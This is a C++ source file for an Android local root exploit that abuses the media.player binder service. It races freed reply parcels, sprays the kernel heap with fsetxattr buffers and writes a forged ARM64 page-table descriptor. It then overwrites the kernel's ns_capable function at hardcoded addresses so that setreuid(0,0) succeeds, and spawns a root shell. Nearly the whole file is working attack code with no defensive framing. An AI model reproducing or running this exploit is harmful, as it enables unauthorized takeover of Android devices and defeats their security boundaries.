#include <stdio.h>
#include <pthread.h>
#include "pwn.h"
#include "cpu.h"
#include <sys/xattr.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <poll.h>

sp<IMediaPlayerService> getMediaPlayer();
sp<IMediaPlayer> mediaPlayer;
#define BAIT 1000
#define BUFF_SIZE 96
Parcel dataBCArray[BAIT];
Parcel replyBCArray[BAIT];

#define HEAP_SPRAY_TIME 30
int fd_heap_spray;

const uint8_t *gDataArray[BAIT];
Parcel dataArray[BAIT], replyArray[BAIT];

int fillFlag = 0;
pthread_mutex_t alloc_mutex;
pthread_cond_t alloc_cond;
int global_parcel_index = 0; 

volatile int stop = 0;
char guardBuffer[1000];
int fd_guard_heap;

int watch_fd;
int watch_wd;

class MediaPlayerBase : public MediaPlayer
{
	public:
		MediaPlayerBase() {};
		~MediaPlayerBase() {};
		sp<IMediaPlayer>	creatMediaPlayer() 
		{
			sp<IMediaPlayerService> service(getMediaPlayer());
		        sp<IMediaPlayer> player(service->create(this, getAudioSessionId()));
			return player;
		}
};

sp<IMediaPlayerService> getMediaPlayer()
{
	sp<IServiceManager> sm = defaultServiceManager();
	String16 name = String16("media.player"); 
	sp<IBinder> service = sm->checkService(name);
	sp<IMediaPlayerService> mediaService = interface_cast<IMediaPlayerService>(service);

	return mediaService;

}

void begin_watch()
{
        watch_fd = inotify_init1(IN_NONBLOCK);
        if (watch_fd == -1) {
                printf("[-] inotify_init1 failed\n");
                return;
        }

        watch_wd = inotify_add_watch(watch_fd, "test_dir",
                                 IN_ALL_EVENTS);
        if (watch_wd == -1) {
                printf("[-] Cannot watch\n");
                return;
        }
}

void stop_watch()
{
	inotify_rm_watch(watch_fd, watch_wd);
	if (watch_fd != 1)
	{
		close(watch_fd);
	}
}

void heapGuard()
{
	fsetxattr(fd_guard_heap, "user.g", guardBuffer, 1000, 0);
}

void kernel_patch_ns_capable(unsigned long * addr) {
        unsigned int *p = (unsigned int *)addr;

        p[0] = 0xD2800020;//MOV x0,#1
        p[1] = 0xD65F03C0;//RET
}

unsigned long get_fack_block(unsigned long phys_addr)
{
	unsigned long fake_d_block = 0l;
	// d_block 中的内容，主要是修改 AP[2:1], 修改为读写属性
    	// bit[1:0]
    	fake_d_block = fake_d_block | (0x0000000000000001);     //                  Y
    	// bit[11:2] lower block attributes
    	fake_d_block = fake_d_block | (0x0000000000000800);     // nG, bit[11]      Y
    	fake_d_block = fake_d_block | (0x0000000000000400);     // AF, bit[10]      Y
    	fake_d_block = fake_d_block | (0x0000000000000200);     // SH, bits[9:8]
    	fake_d_block = fake_d_block | (0x0000000000000040);     // AP[2:1], bits[7:6]
    	fake_d_block = fake_d_block | (0x0000000000000020);     // NS, bit[5]       Y
   	fake_d_block = fake_d_block | (0x0000000000000010);     // AttrIndx[2:0], bits[4:2]
    	// bit[29:12] RES0
    	// bit[47:30] output address
    	fake_d_block = fake_d_block | (phys_addr & 0x0000ffffc0000000);
    	// bit[51:48] RES0
    	// bit[63:52] upper block attributes, [63:55] ignored
    	//fake_d_block = fake_d_block | (0x0010000000000000);     // Contiguous, bit[52]
    	//fake_d_block = fake_d_block | (0x0020000000000000);     // PXN, bit[53]
    	//fake_d_block = fake_d_block | (0x0040000000000000);     // XN, bit[54]
	return fake_d_block;
}

int maximize_fd_limit(void){
    struct  rlimit rlim;
    int ret;

    ret = getrlimit(RLIMIT_NOFILE,&rlim);
    if(ret != 0){
        return -1;
    }

    rlim.rlim_cur = rlim.rlim_max;
    setrlimit(RLIMIT_NOFILE,&rlim);

    ret = getrlimit(RLIMIT_NOFILE,&rlim);
    if(ret != 0){
        return -1;
    }
    return rlim.rlim_cur;
}

status_t setDataSource()
{
	const char * path = "/data/local/tmp/3685c32c15c5dad78aaa19ca697d4ae5.mp4";
	int fd = open(path, O_RDONLY | O_LARGEFILE);
	if (fd < 0)
	{
		printf("[-] open map4 failed\n");
		return -1;
	}
	return mediaPlayer->setDataSource(fd, 0, 0x7ffffffffffffffL);
}

int getCores() {
    	return sysconf(_SC_NPROCESSORS_CONF);
}

void* fillCpu(void *arg)
{
        int index = *(int *)arg;
	cpu_set_t mask;
    	CPU_ZERO(&mask);
    	CPU_SET(index, &mask);
	pid_t pid = gettid();
	syscall(__NR_sched_setaffinity, pid, sizeof(mask), &mask);
	//printf("[+] cpu:%d, tid:%d, freeze\n", index, pid);
	while (!fillFlag)
	{
		index++;
	}

        return arg;
}

void fillOtherCpu()
{
	int cores = getCores();
	printf("[+] cpu count:%d\n", cores);
	pthread_t id_cpu1, id1_cpu1, id2_cpu1, id3_cpu1, id4_cpu1, id5_cpu1, id6_cpu1, id7_cpu1;
	pthread_t id_cpu2, id1_cpu2, id2_cpu2, id3_cpu2, id4_cpu2, id5_cpu2, id6_cpu2, id7_cpu2;
	pthread_t id_cpu3, id1_cpu3, id2_cpu3, id3_cpu3, id4_cpu3, id5_cpu3, id6_cpu3, id7_cpu3;
	int cpu1 = 0;
	int cpu2 = 2;
	int cpu3 = 3;
	pthread_create(&id_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id1_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id2_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id3_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id4_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id5_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id6_cpu1, NULL, fillCpu, &cpu1);
	pthread_create(&id7_cpu1, NULL, fillCpu, &cpu1);

	pthread_create(&id_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id1_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id2_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id3_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id4_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id5_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id6_cpu2, NULL, fillCpu, &cpu2);
	pthread_create(&id7_cpu2, NULL, fillCpu, &cpu2);

	pthread_create(&id_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id1_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id2_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id3_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id4_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id5_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id6_cpu3, NULL, fillCpu, &cpu3);
	pthread_create(&id7_cpu3, NULL, fillCpu, &cpu3);
	sleep(10);
}

void heap_spray()
{
	char buff[BUFF_SIZE];
	memset(buff, 0 ,BUFF_SIZE);
	*(size_t *)((char *)buff + 64) = 20;
	*(size_t *)((char *)buff + 88) = 0xffffffc001e50834;
	fsetxattr(fd_heap_spray, "user.x", buff, BUFF_SIZE, 0);
}

void heap_spray_times()
{
	for (int i = 0; i < HEAP_SPRAY_TIME; i++)
	{
		heap_spray();
		heapGuard();
	}
}

void init_fd_heap_spray()
{
	const char * path = "/data/local/tmp/test_dir/abcd.txt";
        fd_heap_spray = open(path, O_WRONLY);
	if (fd_heap_spray < 0)
	{
		printf("[-] fd_heap_spray failed\n");
	}
}

status_t init_reply_data()
{
	setDataSource();
	AudioPlaybackRate rate;
	rate.mSpeed = 1;
	rate.mPitch = 1;
	rate.mStretchMode = (AudioTimestretchStretchMode)0;
	rate.mFallbackMode = (AudioTimestretchFallbackMode)0x80000e71;
        return mediaPlayer->setPlaybackSettings(rate);
}

void bc_free_buffer(int replyParcelIndex)
{
	replyArray[replyParcelIndex].~Parcel();
	IPCThreadState::self()->flushCommands();
}

void* bc_transaction(void *arg)
{
	pthread_mutex_lock(&alloc_mutex);
	while(1) 
	{
		pthread_cond_wait(&alloc_cond, &alloc_mutex);
		dataBCArray[global_parcel_index].writeInterfaceToken(String16("android.media.IMediaPlayer"));
                IInterface::asBinder(mediaPlayer)->transact(GET_PLAYBACK_SETTINGS, dataBCArray[global_parcel_index], &replyBCArray[global_parcel_index], 0);
	}
	pthread_mutex_unlock(&alloc_mutex);
    	//const uint8_t * replyData = reply.data();
	return arg;
}

void restartWatch()
{
	if (global_parcel_index % 200 == 0)
	{
		stop_watch();
		usleep(100);
		begin_watch();
		usleep(100);
	}
}

void raceWin(int replyParcelIndex)
{
	pthread_mutex_lock(&alloc_mutex);
	bc_free_buffer(replyParcelIndex);
	global_parcel_index = replyParcelIndex;
	pthread_cond_signal(&alloc_cond);
	pthread_mutex_unlock(&alloc_mutex);
	usleep(450);
	bc_free_buffer(replyParcelIndex);
	bc_free_buffer(replyParcelIndex - 1);
	heap_spray_times();
	restartWatch();
} 

void raceTimes()
{
	for(int i = BAIT - 1; i > 0; i--)
	{
		raceWin(i);
	}
}

void put_baits()
{
	//Avoid the reply data to be released by "~Parcel()"
	for (int i = 0; i < BAIT; i++)
	{
		dataArray[i].writeInterfaceToken(String16("android.media.IMediaPlayer"));
		IInterface::asBinder(mediaPlayer)->transact(GET_PLAYBACK_SETTINGS, dataArray[i], &replyArray[i], 0);
		gDataArray[i] = replyArray[i].data();
		/*for (int j = 0; j < (int)replyArray[i].dataSize(); j++)
		{
			printf("[+] gDataArray[%d][%d], data:%x\n", i, j, gDataArray[i][j]);
		}*/
		//printf("index:%d, user_addr:%p\n", i, gDataArray[i]);
	}
}

void createAllocThread()
{
	pthread_mutex_init(&alloc_mutex, NULL);
	pthread_cond_init (&alloc_cond, NULL);
	pthread_t id_transaction;
        pthread_create(&id_transaction,NULL, bc_transaction, NULL);
}

void create_test_dir()
{
    	system("touch /data/local/tmp/test_dir/fffdfffdfffdfffd");
	system("touch /data/local/tmp/test_dir/abcd.txt");
	fd_guard_heap = open("/data/local/tmp/test_dir/fffdfffdfffdfffd", O_WRONLY); 
	if (fd_guard_heap < 0)
	{
		printf("[-] fd_guard_heap failed\n");
	}
	init_fd_heap_spray();
}

void init_test_dir()
{
	memset(guardBuffer, 0 ,1000);
	system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
	create_test_dir();
	begin_watch();
}

int main()
{
	createAllocThread();
	nice(-20);
	MediaPlayerBase* mediaPlayerBase = new MediaPlayerBase();
	mediaPlayer = mediaPlayerBase->creatMediaPlayer();
	init_reply_data();
	init_test_dir();
	int max_fds = maximize_fd_limit();
	printf("[+] current pid:%d, max_fd:%d, descript:%lx\n", getpid(), max_fds, get_fack_block(0x80000000));
	put_baits();
	fillOtherCpu();
	raceTimes();
	printf("[+] race finish\n");
	fillFlag = 1;
	stop = 1;
	unsigned long ns_capable_addr  = 0xffffffc0000b1024 - 0xffffffc000000000 + 0xffffffc200000000;
        kernel_patch_ns_capable((unsigned long *) ns_capable_addr);
	if(setreuid(0, 0) || setregid(0, 0)){
       		printf("[-] setgid failed\n");
		return -1;
        }
	if (getuid() == 0)
        {
                printf("[+] spawn a root shell\n");
                execl("/system/bin/sh", "/system/bin/sh", NULL);
        }
	
	delete mediaPlayerBase;
	return 0;
}
